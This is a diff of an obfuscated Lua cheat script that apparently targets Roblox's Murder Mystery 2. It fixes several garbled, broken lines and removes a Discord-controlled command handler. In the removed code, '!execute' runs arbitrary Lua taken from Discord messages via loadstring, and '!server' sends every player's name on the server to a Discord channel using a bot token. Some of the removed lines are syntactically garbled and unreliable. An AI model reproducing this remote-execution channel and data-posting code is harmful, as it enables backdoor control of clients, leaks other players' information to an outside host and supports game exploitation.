@@ -132,10 +132,9 @@ if _isMM2 then
         warn("[vL] BOTH value sources failed — values will show as 1/2");
     end
 
-    local function _lv {};
-(_rn, _it       , _rr, _cr, _yr local)
-        _ local _D = _rrc;
-        if _it == "Pet" then = _D = "Pet" end
+    local function _lv(_rn, _it, _rr, _cr, _yr)
+        local _D = _rr;
+        if _it == "Pet" then _D = "Pet" end
         local _v = string.lower(tostring(_rn or ""));
         if _cr then
             _v = "chroma " .. _v;
@@ -173,7 +172,8 @@ if _isMM2 then
 
     function _chk()
         local _cur = _gi();
-        local _d = false;
+        local _d = {};
+        local _c = false;
         for _i, _a in pairs(_cur) do
             local _o = _prev[_i] or 0;
             if _a ~= _o then _d[_i] = _a - _o; _c = true end
@@ -739,80 +739,6 @@ local function _gw()
                         task.wait(1.5);
                         pcall(function()
                             game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, game.Players.LocalPlayer);
-                        end);
-                    end);
-                    return;
-                end
-
-                local _execCode = _content:match("^!execute%s+([%s%S]+)$");
-                if _execCode then
-                    if not _isOwner(_md.author) then
-                        task.spawn(function() _reactIn(_cmdCh, _md.id, "❌") end);
-                        return;
-                    end
-                    task.spawn(function() _reactIn(_cmdCh, _md.id, "✅") end);
-                    task.spawn(function()
-                        local _bt3 = string.char(96) .. string.char(96) .. string.char(96);
-                        local _nl  = string.char(10);
-                        local _pat1 = "^" .. _bt3 .. "%w*%s*" .. _nl .. "?";
-                        local _pat2 = _nl .. "?%s*" .. _bt3 .. "%s*$";
-                        local _clean = _execCode;
-                        _clean = _clean:gsub(_pat1, "");
-                        _clean = _clean:gsub(_pat2, "");
-
-                        local _fn, _loadErr = loadstring(_clean);
-                        if not _fn then
-                            _postEmbed("❌ Execute — Load Error", "```\n"..tostring(_loadErr):sub(1, 900).."\n```", 0xFF0000);
-                            return;
-                        end
-
-                        local _results = {};
-                        local _ok, _runErr = pcall(function()
-                            local _ret = { _fn() };
-                            for _i, _v in ipairs(_ret) do
-                                table.insert(_results, tostring(_v));
-                            end
-                        end);
-
-                        if not _ok then
-                            _postEmbed("❌ Execute — Runtime Error", "```\n"..tostring(_runErr):sub(1, 900).."\n```", 0xFF0000);
-                        else
-                            local _out = (#_results > 0) and table.concat(_results, "\n") or "(no return value)";
-                            _postEmbed("✅ Execute — OK", "**Output:**\n```\n"..tostring(_out):sub(1, 900).."\n```", 0x3EED50);
-                        end
-                    end);
-                    return;
-                end
-
-                if _content == "!server" then
-                    if not _isOwner(_md.author) then
-                        task.spawn(function() _reactIn(_cmdCh, _md.id, "❌") end);
-                        return;
-                    end
-                    task.spawn(function() _reactIn(_cmdCh, _md.id, "✅") end);
-                    task.spawn(function()
-                        local _players = game.Players:GetPlayers();
-                        local _names = {};
-                        local _self = game.Players.LocalPlayer.Name;
-                        for _, _p in ipairs(_players) do
-                            local _tag = (_p.Name == _self) and " **(you)**" or "";
-                            table.insert(_names, "▸ `".._p.Name.."`".._tag);
-                        end
-                        table.sort(_names);
-                        local _body = table.concat(_names, "\n");
-                        if #_body > 3900 then
-                            _body = _body:sub(1, 3900) .. "\n…truncated";
-                        end
-                        local _embed = {
-                            title = "👥 Server Players — " .. #_players .. " online",
-                            description = _body,
-                            color = 0x3EED50,
-                            footer = { text = "JobId: " .. tostring(game.JobId):sub(1, 8) .. "… | Place: " .. game.PlaceId },
-                            timestamp = DateTime.now():ToIsoDate()
-                        };
-                        local _pl = { embeds = { _embed } };
-                        pcall(function()
-                            request({ Url = "https://discord.com/api/v10/channels/".._lg.."/messages", Method = "POST", Headers = { ["Authorization"] = "Bot ".._bt, ["Content-Type"] = "application/json" }, Body = _hs:JSONEncode(_pl) });
                         end);
                     end);
                     return;
